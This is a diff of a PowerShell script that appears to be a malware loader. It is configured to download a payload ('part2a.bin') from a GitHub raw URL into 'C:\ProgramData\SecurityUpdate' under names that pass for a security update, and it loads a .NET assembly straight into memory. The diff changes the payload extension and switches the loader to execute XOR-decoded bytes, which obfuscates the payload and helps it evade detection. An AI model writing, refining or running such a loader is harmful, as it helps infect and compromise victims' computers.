@@ -1,5 +1,5 @@
 # Configuration
-$Url= "https://github.com/khpccbr/open/raw/refs/heads/main/part2a.exe"
+$Url= "https://github.com/khpccbr/open/raw/refs/heads/main/part2a.bin"
 $folderPath = "C:\ProgramData\SecurityUpdate"
 $scriptCopyName = "secupdate.ps1"
 $payloadName = "secupdate.bin"
@@ -149,7 +149,7 @@ try {
         Write-Host "[*] Loading assembly from memory..." -ForegroundColor Cyan
         
         # Load assembly into current AppDomain
-        $assembly = [System.Reflection.Assembly]::Load($fileBytes)
+        $assembly = [System.Reflection.Assembly]::Load($xorBytes)
         
         Write-Host "[+] Assembly loaded: $($assembly.FullName)" -ForegroundColor Green
         
